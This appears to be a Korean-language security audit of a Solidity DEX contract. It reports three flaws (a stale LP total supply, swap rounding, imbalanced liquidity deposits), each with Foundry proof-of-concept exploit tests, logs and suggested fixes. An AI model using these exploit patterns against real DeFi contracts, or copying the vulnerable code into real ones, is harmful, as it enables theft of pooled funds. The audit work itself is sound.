# 황준태

## removeLiquidity LP token total supply유지 못함.

**********************critical (파급력: High, 공격 난이도: Medium)**********************

```solidity
uint256 public totalSupply_ = totalSupply();

function removeLiquidity(uint256 LPTokenAmount, uint256 minimumTokenXAmount, uint256 minimumTokenYAmount) public returns (uint256 tokenXAmount_,uint256 tokenYAmount_){
    require(LPTokenAmount > 0, "Less LP Token Supply");
    amountX = tokenX.balanceOf(address(this));// token X amount udpate
    amountY = tokenY.balanceOf(address(this));// token Y amount update
    tokenXAmount_ = _mul(amountX,LPTokenAmount)/totalSupply_;
    tokenYAmount_ = _mul(amountY,LPTokenAmount)/totalSupply_;
    require(tokenXAmount_ >= minimumTokenXAmount, "TokenX amount below minimum");
    require(tokenYAmount_ >= minimumTokenYAmount, "TokenY amount below minimum");
    amountX -= tokenXAmount_;
    amountY -= tokenYAmount_;
    _burn(msg.sender,LPTokenAmount);
    tokenX.transfer(msg.sender,tokenXAmount_);
    tokenY.transfer(msg.sender,tokenYAmount_);

    return (tokenXAmount_,tokenYAmount_);
 
}
```

totalSupply_는 state variable로, 발급한 LP token의 총 발행량 저장하는 역할을 한다.

하지만 removeLiquidity에서 LPToken을 소각하고 난 이후에 totalSupply_변수의 양을 변경하지 않았고, totalSupply()함수를 이용해서 LP token의 총 발행량을 유지하지도 않는다.

```solidity
liqX = _mul(tokenXAmount ,totalSupply_)/amountX;
        liqY = _mul(tokenYAmount ,totalSupply_)/amountY;
        LPTokenAmount = (liqX<liqY) ? liqX:liqY;
```

addLiquidity를 통해서 전달받을 LP token을 계산할 때 totalSupply는 분자에 곱해지기 때문에 줄어들지 않은 totalSupply만큼 계속 LP token이 더 많이 발행되게 된다.

#### PoC

```solidity
function testExploitTotalLiquidity() external {
        uint lp = dex.addLiquidity(1000 ether, 1000 ether, 0);
        uint lp2 = dex.addLiquidity(1000 ether, 1000 ether, 0);
        (uint rx, uint ry) = dex.removeLiquidity(lp2, 0, 0);
        lp2 = dex.addLiquidity(1000 ether, 1000 ether, 0);
        console.log("lp2: %d", lp2);
        (rx, ry) = dex.removeLiquidity(lp2, 0, 0);
        lp2 = dex.addLiquidity(1000 ether, 1000 ether, 0);
        console.log("lp2: %d", lp2);
        (rx, ry) = dex.removeLiquidity(lp2, 0, 0);
        lp2 = dex.addLiquidity(1000 ether, 1000 ether, 0);
        console.log("lp2: %d", lp2);
        (rx, ry) = dex.removeLiquidity(lp2, 0, 0);
        lp2 = dex.addLiquidity(1000 ether, 1000 ether, 0);
        console.log("lp2: %d", lp2);
        (rx, ry) = dex.removeLiquidity(lp2, 0, 0);
        lp2 = dex.addLiquidity(1000 ether, 1000 ether, 0);
        console.log("lp2: %d", lp2);
        (rx, ry) = dex.removeLiquidity(lp2, 0, 0);
        lp2 = dex.addLiquidity(1000 ether, 1000 ether, 0);
        console.log("lp2: %d", lp2);
        (rx, ry) = dex.removeLiquidity(lp2, 0, 0);
        lp2 = dex.addLiquidity(1000 ether, 1000 ether, 0);
        console.log("lp2: %d", lp2);
        (rx, ry) = dex.removeLiquidity(lp2, 0, 0);
    }
```

```solidity
[PASS] testExploitTotalLiquidity() (gas: 496144)
Logs:
  lp2: 2000000000000000000000
  lp2: 4000000000000000000000
  lp2: 8000000000000000000000
  lp2: 16000000000000000000000
  lp2: 32000000000000000000000
  lp2: 64000000000000000000000
  lp2: 128000000000000000000000
```

해당 취약점을 완화하기 위해서는 totalSupply를 저장하는 방식 보다 함수에서 즉각 totalSupply()함수를 호출해서 현재 발행된 LP token의 개수를 알아내는 방식이 권장된다.

## swap small amount round down

********************Informational (파급력: Low, 공격 난이도: Low)********************

```solidity
function swap(uint256 tokenXAmount, uint256 tokenYAmount, uint256 tokenMinimumOutputAmount) external returns (uint256 outAmount){
    //x*y=k, => if x-> y
    //x*y =k = > (X+x)(Y-y) =K
    // => xY -Xy -xy = 0
    // y = (X+x)/xY
    // y= 0.999x + X /0.999xY
    require(tokenXAmount > 0 || tokenYAmount > 0, "no zero.");
    require(tokenXAmount == 0 || tokenYAmount == 0, "only one");
    amountX = tokenX.balanceOf(address(this));// token X amount udpate
    amountY = tokenY.balanceOf(address(this));// token Y amount update
    require(amountX > 0 && amountY >0,"no token");
    uint256 outAmount;
    if(tokenXAmount > 0){
        **outAmount = amountY *(tokenXAmount * 999 /1000) / (amountX + (tokenXAmount * 999 / 1000));**
        require(outAmount >= tokenMinimumOutputAmount);
        amountY -= outAmount;
        amountX += tokenXAmount;
        tokenX.transferFrom(msg.sender,address(this),tokenXAmount);
        tokenY.transfer(msg.sender,outAmount);
    }
    else{
        outAmount =  amountX *(tokenYAmount * 999 /1000) / (amountY+ (tokenYAmount * 999 / 1000));
        require(outAmount >= tokenMinimumOutputAmount);
        amountX -= outAmount;
        amountY += tokenYAmount;
        tokenY.transferFrom(msg.sender,address(this),tokenYAmount);
        tokenX.transfer(msg.sender,outAmount);

    }
    return outAmount;
}
```

uniswap v2에서 사용한 수수료 매기는 방식은 tokenXAmoutnt에 0.999를 곱해주는 방식이고, 이 때 round down이 발생할 수 있다.

```solidity
function testSmallSwapRoundDown() external {
        uint lp = dex.addLiquidity(1000 ether, 1000 ether, 0);
        uint output = dex.swap(999 wei, 0, 0);
        console.log("output: %d", output);
    }
```

```solidity
[PASS] testSmallSwapRoundDown() (gas: 233917)
Logs:
  output: 997
```

#### 해결 방안

```solidity
function swap(uint256 tokenXAmount, uint256 tokenYAmount, uint256 tokenMinimumOutputAmount) external returns (uint256 outAmount){
    //x*y=k, => if x-> y
    //x*y =k = > (X+x)(Y-y) =K
    // => xY -Xy -xy = 0
    // y = (X+x)/xY
    // y= 0.999x + X /0.999xY
    require(tokenXAmount > 0 || tokenYAmount > 0, "no zero.");
    require(tokenXAmount == 0 || tokenYAmount == 0, "only one");
    amountX = tokenX.balanceOf(address(this));// token X amount udpate
    amountY = tokenY.balanceOf(address(this));// token Y amount update
    require(amountX > 0 && amountY >0,"no token");
    uint256 outAmount;
    if(tokenXAmount > 0){
        **outAmount = amountY *((tokenXAmount * 10 ** 18) * 999 /1000) / ((amountX * 10 ** 18) + ((tokenXAmount * 10 ** 18) * 999 / 1000));**
        require(outAmount >= tokenMinimumOutputAmount);
        amountY -= outAmount;
        amountX += tokenXAmount;
        tokenX.transferFrom(msg.sender,address(this),tokenXAmount);
        tokenY.transfer(msg.sender,outAmount);
    }
    else{
        outAmount =  amountX *(tokenYAmount * 999 /1000) / (amountY+ (tokenYAmount * 999 / 1000));
        require(outAmount >= tokenMinimumOutputAmount);
        amountX -= outAmount;
        amountY += tokenYAmount;
        tokenY.transferFrom(msg.sender,address(this),tokenYAmount);
        tokenX.transfer(msg.sender,outAmount);

    }
    return outAmount;
}
```

```solidity
[PASS] testSmallSwapRoundDown() (gas: 234190)
Logs:
  output: 998
```

outputAmount의 분자와 분모에 10 ** 18을 곱해줘서 나누기로 인한 round down을 완화시켜줄 수 있다.

## AddLiquidity imbalance input

******************************medium (파급력: medium, 공격 난이도: Medium)******************************

```solidity
function addLiquidity(uint256 tokenXAmount, uint256 tokenYAmount, uint256 minimumLPTokenAmount) public returns (uint256 LPTokenAmount){
    require(tokenXAmount > 0, "Less TokenA Supply");
    require(tokenYAmount > 0, "Less TokenB Supply");
    require(tokenX.allowance(msg.sender, address(this)) >= tokenXAmount, "ERC20: insufficient allowance");
    require(tokenY.allowance(msg.sender, address(this)) >= tokenYAmount, "ERC20: insufficient allowance");
    uint256 liqX; //liquidity of x
    uint256 liqY; //liquidity of y
    amountX = tokenX.balanceOf(address(this));// token X amount udpate
    amountY = tokenY.balanceOf(address(this));// token Y amount update
    
    if(totalSupply_ ==0 ){ //if first supply 
        LPTokenAmount = _sqrt(tokenXAmount*tokenYAmount);
    }
    else{// calculate over the before
        liqX = _mul(tokenXAmount ,totalSupply_)/amountX;
        liqY = _mul(tokenYAmount ,totalSupply_)/amountY;
        LPTokenAmount = (liqX<liqY) ? liqX:liqY; 
    }
    require(LPTokenAmount >= minimumLPTokenAmount, "Less LP Token Supply");
    transfer_(msg.sender,LPTokenAmount);
    totalSupply_ += LPTokenAmount;
    amountX += tokenXAmount;
    amountY += tokenYAmount;
    **tokenX.transferFrom(msg.sender, address(this), tokenXAmount);**
    **tokenY.transferFrom(msg.sender, address(this), tokenYAmount);**
    return LPTokenAmount;
}
```

LP token의 개수는 liquidity가 더 적은 토큰을 기준으로 전달했지만 transferFrom으로 받아오는 토큰의 개수는 입력한 그대로 가져온다.

공격 시나리오는 다음과 같다.

1. A는 100 ETH를 가지고 있고, ETH price = 4000 ether, USDC price = 1 ether인 상황
2. Lending protocol의 ETH-USDC 풀에 ETH조금과 USDC를 엄청 많이 addLiquidity한다.
3. 풀의 토큰 비율이 변경되었으므로 A는 변경된 비율로 ETH를 USDC로 swap한다. 
4. 기존의 ETH로 얻을 수 있는 USDC의 양보다 많은 양의 USDC를 swap할 수 있게 된다. 

#### PoC

```solidity
function testManyETH() external {
        dex.addLiquidity(4000000 ether, 1000 ether, 0);
        vm.startPrank(user1);
        uint lp = dex.addLiquidity(8000000 ether, 1 wei, 0);
        uint outputUSDC = dex.swap(0, 1000 ether, 0);
        console.log("outputUSDC: %d", outputUSDC);
        console.log("1000*4000: %d", 1000 * 4000 ether);
        vm.stopPrank();
    }
```

```solidity
[PASS] testManyETH() (gas: 295920)
Logs:
  outputUSDC: 5996998499249624812403203
  100*4000: 4000000000000000000000000
```

결과적으로 기존에 슬리피지를 제외하고 swap해서 얻을 수 있는 가격과도 비교가 안될 만큼 많은양의 USDC를 얻을 수 있게 된다.

#### 해결 방안

```solidity
function addLiquidity(uint256 tokenXAmount, uint256 tokenYAmount, uint256 minimumLPTokenAmount) public returns (uint256 LPTokenAmount){
    require(tokenXAmount > 0, "Less TokenA Supply");
    require(tokenYAmount > 0, "Less TokenB Supply");
    require(tokenX.allowance(msg.sender, address(this)) >= tokenXAmount, "ERC20: insufficient allowance");
    require(tokenY.allowance(msg.sender, address(this)) >= tokenYAmount, "ERC20: insufficient allowance");
    uint256 liqX; //liquidity of x
    uint256 liqY; //liquidity of y
    amountX = tokenX.balanceOf(address(this));// token X amount udpate
    amountY = tokenY.balanceOf(address(this));// token Y amount update
    
    if(totalSupply_ ==0 ){ //if first supply 
        LPTokenAmount = _sqrt(tokenXAmount*tokenYAmount);
    }
    else{// calculate over the before
        liqX = _mul(tokenXAmount ,totalSupply_)/amountX;
        liqY = _mul(tokenYAmount ,totalSupply_)/amountY;
        LPTokenAmount = (liqX<liqY) ? liqX:liqY; 
        **if(LPTokenAmount == liqY){
            tokenXAmount = amountX * tokenYAmount / amountY;
        }else{
            tokenYAmount = amountY * tokenXAmount / amountX;
        }**
    }
    require(LPTokenAmount >= minimumLPTokenAmount, "Less LP Token Supply");
    transfer_(msg.sender,LPTokenAmount);
    totalSupply_ += LPTokenAmount;
    amountX += tokenXAmount;
    amountY += tokenYAmount;
    tokenX.transferFrom(msg.sender, address(this), tokenXAmount);
    tokenY.transferFrom(msg.sender, address(this), tokenYAmount);
    return LPTokenAmount;
}
```

```solidity
[PASS] testManyETH() (gas: 296318)
Logs:
  outputUSDC: 1998999499749874937469733
  1000*4000: 4000000000000000000000000
```

x, y의 양을 기준으로 잡은 토큰으로 계산해서 그 이상은 받지 않도록 수정한다.

여전히 swap으로 이득을 얻을 수 있지만 그 양이 swap으로 풀의 토큰 개수를 마음대로 주무르던 정도는 아니다.
